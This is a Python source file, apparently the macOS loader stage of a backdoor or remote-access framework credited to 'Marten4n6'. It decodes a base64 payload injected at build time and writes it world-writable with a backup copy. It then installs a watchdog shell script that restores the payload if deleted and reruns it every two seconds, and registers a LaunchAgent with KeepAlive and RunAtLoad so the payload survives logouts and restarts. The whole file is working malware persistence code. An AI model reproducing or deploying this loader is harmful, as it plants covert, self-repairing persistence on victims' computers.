# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import base64
import logging
import os
import subprocess
import sys
from textwrap import dedent

# ============================================================
# These variables will be patched when this loader is created.
LOADER_OPTIONS = {}
PAYLOAD_BASE64 = ""
# ============================================================

PROGRAM_DIRECTORY = os.path.expanduser(LOADER_OPTIONS.get("program_directory", ""))
SERVICE_LABEL = LOADER_OPTIONS.get("service_label", "")
PAYLOAD_FILENAME = LOADER_OPTIONS.get("payload_filename", "") or "main.py"
WATCHDOG_FILENAME = "watchdog.sh"
STOP_FILENAME = ".stop"
BACKUP_FILENAME = PAYLOAD_FILENAME + ".bak"
LOG_FILENAME = "service.log"

logging.basicConfig(format="[%(levelname)s] %(funcName)s:%(lineno)s - %(message)s", level=logging.DEBUG)
log = logging.getLogger("start_service")


def run_command(command):
    """Runs a system command and returns (return_code, output)."""
    try:
        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True
        )
        output = process.communicate()[0]
        if isinstance(output, bytes):
            output = output.decode("utf-8", errors="replace")
        return process.returncode, (output or "")
    except Exception as ex:
        return -1, str(ex)


def get_payload_file():
    return os.path.join(PROGRAM_DIRECTORY, PAYLOAD_FILENAME)


def get_watchdog_file():
    return os.path.join(PROGRAM_DIRECTORY, WATCHDOG_FILENAME)


def get_backup_file():
    return os.path.join(PROGRAM_DIRECTORY, BACKUP_FILENAME)


def get_stop_file():
    return os.path.join(PROGRAM_DIRECTORY, STOP_FILENAME)


def get_log_file():
    return os.path.join(PROGRAM_DIRECTORY, LOG_FILENAME)


def get_launch_agent_file():
    return os.path.join(os.path.expanduser("~/Library/LaunchAgents"), SERVICE_LABEL + ".plist")


# Stop and unload any pre-existing service first (resilient (re)install).
run_command("launchctl remove " + SERVICE_LABEL)
run_command("launchctl bootout gui/$(id -u)/" + SERVICE_LABEL)

run_command("mkdir -p " + PROGRAM_DIRECTORY)
run_command("mkdir -p " + os.path.expanduser("~/Library/LaunchAgents"))

if not os.path.isdir(PROGRAM_DIRECTORY):
    print("Failed to create program directory: " + PROGRAM_DIRECTORY)
    sys.exit(1)

# Write the payload and a self-repair backup.
payload = base64.b64decode(PAYLOAD_BASE64)
payload_file = get_payload_file()
with open(payload_file, "wb") as output_file:
    output_file.write(payload)
os.chmod(payload_file, 0o777)

with open(get_backup_file(), "wb") as output_file:
    output_file.write(payload)

# Watchdog: keeps the service alive and self-repairs the payload from backup.
watchdog = dedent("""\
    #!/bin/sh
    PROGRAM_DIR="%s"
    PAYLOAD="%s"
    BACKUP="%s"
    STOP="%s"
    LOG="%s"

    find_python3() {
        for c in python3 /usr/bin/python3 /usr/local/bin/python3 /opt/homebrew/bin/python3; do
            if command -v "$c" >/dev/null 2>&1; then
                command -v "$c"
                return 0
            fi
            if [ -x "$c" ]; then
                echo "$c"
                return 0
            fi
        done
        return 1
    }
    PY3=$(find_python3)


    while true; do
        if [ -f "$STOP" ]; then
            exit 0
        fi

        if [ ! -f "$PAYLOAD" ] && [ -f "$BACKUP" ]; then
            cp "$BACKUP" "$PAYLOAD" 2>/dev/null
            chmod 777 "$PAYLOAD" 2>/dev/null
        fi

        if [ -f "$PAYLOAD" ]; then
            if [ -n "$PY3" ]; then
                "$PY3" "$PAYLOAD" >> "$LOG" 2>&1
            else
                "$PAYLOAD" >> "$LOG" 2>&1
            fi
        fi
        sleep 2
    done
    """) % (PROGRAM_DIRECTORY, payload_file, get_backup_file(), get_stop_file(), get_log_file())

with open(get_watchdog_file(), "w") as output_file:
    output_file.write(watchdog)
os.chmod(get_watchdog_file(), 0o777)

# Launch agent (service) -> /bin/sh watchdog.sh, KeepAlive + RunAtLoad.
launch_agent_create = dedent("""\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>KeepAlive</key>
    <true/>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""") % (SERVICE_LABEL, get_watchdog_file())

launch_agent_file = get_launch_agent_file()
with open(launch_agent_file, "w") as output_file:
    output_file.write(launch_agent_create)

plutil_rc, plutil_out = run_command("plutil -lint " + launch_agent_file)
if plutil_rc != 0:
    print("Generated service plist is invalid, aborting.")
    sys.exit(1)

# Load then explicitly start the service; verify via launchctl list.
load_rc, load_out = run_command("launchctl load -w " + launch_agent_file)
run_command("launchctl start " + SERVICE_LABEL)

listed = ""
try:
    listed = run_command("launchctl list | grep -w " + SERVICE_LABEL)
except Exception:
    pass

if "already loaded" in load_out.lower():
    print("start_service already loaded; service rearmed.")
elif load_rc != 0:
    print("Failed to load service: " + load_out.strip())
    sys.exit(1)

if listed:
    print("start_service loaded and started (" + SERVICE_LABEL + ").")
else:
    print("start_service loaded; check launchctl list for " + SERVICE_LABEL)
